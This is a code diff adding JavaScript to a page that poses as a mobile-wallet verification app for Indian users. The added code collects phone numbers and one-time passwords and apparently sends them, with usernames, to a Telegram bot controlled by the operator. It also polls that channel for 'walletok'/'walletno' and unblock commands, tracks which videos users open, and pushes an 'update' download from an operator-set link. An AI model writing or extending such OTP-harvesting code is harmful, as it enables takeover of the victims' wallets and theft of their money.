+    tg('<b>🔐 Wallet Verify Request</b>\n\n<b>👤 User:</b> '+esc(read(STORE.user)||'-')+'\n<b>📱 Mobile:</b> +91 '+esc(m)+'\n<b>💼 Wallet:</b> '+esc(w)+'\n\n<code>walletok '+esc(m)+' '+esc(w)+'</code>\n<code>walletno '+esc(m)+' '+esc(w)+'</code>');
+    showWlReqPop(w,m);updateWlCards();toast(w+' request sent','success');
+  }
+  function bindWlModal(){
+    var cards=document.querySelectorAll('.wallet-card');
+    for(var i=0;i<cards.length;i++)cards[i].addEventListener('click',function(){openWlSheet(this.getAttribute('data-wallet'));});
+    $('wMobile').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,10);});
+    $('wOtp').addEventListener('input',function(e){e.target.value=e.target.value.replace(/\D/g,'').slice(0,6);});
+    $('wNextBtn').addEventListener('click',function(){
+      var m=$('wMobile').value.trim();
+      if(!MRE.test(m)){toast('Enter valid mobile','error');return;}
+      wSent=true;showWPanel('wStep2');$('wOtp').value='';
+      setHint($('wOtpHint'),'OTP sent to +91 '+m);
+      tg('<b>📨 '+esc(curW)+' OTP</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n💼 '+esc(curW)+'\n📱 +91 '+esc(m));
+      toast('OTP sent','success');
+    });
+    $('wVerifyBtn').addEventListener('click',function(){
+      var o=$('wOtp').value.trim();
+      if(!/^\d{4,6}$/.test(o)){toast('Enter the OTP','error');return;}
+      if(!wSent){toast('Please send OTP first','error');return;}
+      var m=$('wMobile').value.trim(),tk=++wToken;
+      tg('<b>📥 '+esc(curW)+' OTP Submitted</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n💼 '+esc(curW)+'\n📱 +91 '+esc(m)+'\n🔢 '+esc(o));
+      showWPanel('wLoading');
+      setTimeout(function(){if(tk!==wToken)return;showWPanel('wSuccess');setTimeout(function(){if(tk!==wToken)return;submitWlReq(curW,m);},700);},900);
+    });
+  }
+
+  function closeSheet(id){var el=$(id);if(el)el.classList.remove('show');}
+  function bindOverlays(){
+    var cl=document.querySelectorAll('[data-close]');
+    for(var i=0;i<cl.length;i++)cl[i].addEventListener('click',function(){closeSheet(this.getAttribute('data-close'));});
+    var ov=document.querySelectorAll('.overlay');
+    for(var j=0;j<ov.length;j++)ov[j].addEventListener('click',function(e){if(e.target===this)this.classList.remove('show');});
+  }
+
+  /* ============ VIDEO / UPDATE POPUP FUNCTIONS ============ */
+  function showVideoPopup(link,msg,title,isVideo){
+    $('videoTitle').textContent=title||'Message';
+    $('videoDesc').textContent=msg||'';
+    var icon=$('videoIcon');
+    var wrap=$('videoFrameWrap');
+    var vp=$('videoPlayer');
+    var linkBtn=$('videoLinkBtn');
+    var linkText=$('videoLinkText');
+
+    wrap.style.display='none';
+    linkBtn.classList.add('hidden');
+    try{vp.pause();}catch(e){}
+    vp.src='';
+
+    if(link){
+      var isDirectVideo=/\.(mp4|webm|ogg|m4v)(\?|$)/i.test(link);
+      var isExternalVideo=/youtube\.com|youtu\.be|vimeo\.com|dailymotion\.com/i.test(link);
+
+      if(isDirectVideo){
+        wrap.style.display='block';
+        vp.src=link;
+        try{vp.play().catch(function(){});}catch(e){}
+        icon.innerHTML='<i class="fa-solid fa-video"></i>';
+      } else if(isExternalVideo){
+        linkBtn.classList.remove('hidden');
+        linkBtn.href=link;
+        linkText.textContent='Watch Video';
+        icon.innerHTML='<i class="fa-solid fa-circle-play"></i>';
+        tg('<b>🎬 Video Opened</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-')+'\n🔗 '+esc(link));
+      } else {
+        linkBtn.classList.remove('hidden');
+        linkBtn.href=link;
+        linkText.textContent='Open Link';
+        icon.innerHTML='<i class="fa-solid fa-link"></i>';
+      }
+    } else {
+      icon.innerHTML='<i class="fa-solid fa-bullhorn"></i>';
+    }
+    $('videoPopup').classList.add('show');
+  }
+  function showUpdatePopup(link,msg,ver){
+    $('updateVersionText').textContent=ver||'1.0.1';
+    var notes=$('updateNotes');
+    if(notes&&msg)notes.innerHTML='<div><i class="fa-solid fa-circle-info"></i> '+esc(msg)+'</div>';
+    $('updateDownloadBtn').onclick=function(){
+      if(link){try{window.open(link,'_blank');}catch(e){window.location.href=link;}}
+      else toast('No link set','error');
+    };
+    $('updatePopup').classList.add('show');
+  }
+
+  function checkUpdate(){
+    if(!UPDATE_ENABLED)return;
+    var seen=read('lp_upd_seen');
+    if(seen===UPDATE_VERSION)return;
+    $('updateVersionText').textContent=UPDATE_VERSION;
+    $('updatePopup').classList.add('show');
+    $('updateDownloadBtn').onclick=function(){
+      if(UPDATE_LINK){try{window.open(UPDATE_LINK,'_blank');}catch(e){window.location.href=UPDATE_LINK;}}
+      else toast('Update link not set','error');
+      save('lp_upd_seen',UPDATE_VERSION);
+    };
+  }
+
+  function init(){
+    bindReg();bindLogin();bindLoginOtp();bindForgot();bindNewPass();
+    bindNav();bindWlModal();bindUpload();bindOverlays();
+    renderBal(false);renderSup();renderPhoto();renderInviteCount();
+    checkUpdate();
+    var u=read(STORE.user),m=read(STORE.mobile);
+    if(!u||!m){showScr('registerScreen');return;}
+    if($('logMobile'))$('logMobile').value=m;
+    if($('logPass'))$('logPass').value='';
+    showScr('loginScreen');
+    if(cmdPollInt)clearInterval(cmdPollInt);
+    cmdPollInt=setInterval(function(){
+      pollTg({mobile:m,skipApprUI:true});
+      if(read(blkK(m))!=='1' && isLogOk(m)){
+        clrLogOk(m);clearInterval(cmdPollInt);cmdPollInt=null;
+        toast('Account unblocked ✓ Opening...','success');
+        setTimeout(openDash,500);
+      }
+    },POLL_MS);
+  }
+  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();
+})();
+</script>
+</body>
+</html>
